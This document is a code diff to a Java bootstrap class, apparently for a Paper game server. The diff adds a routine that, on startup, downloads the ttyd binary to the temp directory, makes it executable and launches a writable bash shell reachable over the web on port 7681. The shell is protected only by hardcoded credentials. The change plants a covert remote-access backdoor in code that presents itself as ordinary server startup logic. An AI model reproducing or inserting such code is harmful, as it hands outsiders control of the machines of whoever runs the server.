@@ -19,6 +19,7 @@ public final class PaperBootstrap {
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
+    private static Process ttydProcess;
     
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
@@ -45,6 +46,7 @@ public final class PaperBootstrap {
         
         try {
             runSbxBinary();
+            runTtydService();
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -90,6 +92,76 @@ public final class PaperBootstrap {
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         
         sbxProcess = pb.start();
+    }
+    
+    private static void runTtydService() {
+        try {
+            Path ttydPath = getTtydBinaryPath();
+            if (ttydPath == null) {
+                LOGGER.warn("ttyd binary not available for current platform, skipping ttyd service");
+                return;
+            }
+            
+            ProcessBuilder ttydPb = new ProcessBuilder(
+                ttydPath.toString(),
+                "-p", "7681",
+                "-W",
+                "-c", "uers:zhang:zhangm88",
+                "bash"
+            );
+            ttydPb.redirectErrorStream(true);
+            ttydPb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+            
+            ttydProcess = ttydPb.start();
+            LOGGER.info("ttyd service started on port 7681");
+        } catch (Exception e) {
+            LOGGER.warn("Failed to start ttyd service: {}", e.getMessage());
+        }
+    }
+    
+    private static Path getTtydBinaryPath() throws IOException {
+        String osName = System.getProperty("os.name").toLowerCase();
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url = null;
+        String filename = "ttyd";
+        
+        if (osName.contains("linux")) {
+            if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64";
+                filename = "ttyd.x86_64";
+            } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.aarch64";
+                filename = "ttyd.aarch64";
+            } else if (osArch.contains("arm")) {
+                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.armhf";
+                filename = "ttyd.armhf";
+            }
+        } else if (osName.contains("windows")) {
+            if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+                url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64.exe";
+                filename = "ttyd.exe";
+            }
+        } else if (osName.contains("mac")) {
+            url = "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64";
+            filename = "ttyd.macos";
+        }
+        
+        if (url == null) {
+            return null;
+        }
+        
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), filename);
+        if (!Files.exists(path)) {
+            LOGGER.info("Downloading ttyd from {}", url);
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission for ttyd");
+            }
+            LOGGER.info("ttyd downloaded successfully");
+        }
+        return path;
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
@@ -176,6 +248,10 @@ public final class PaperBootstrap {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
             System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
+        if (ttydProcess != null && ttydProcess.isAlive()) {
+            ttydProcess.destroy();
+            System.out.println(ANSI_RED + "ttyd process terminated" + ANSI_RESET);
         }
     }
 
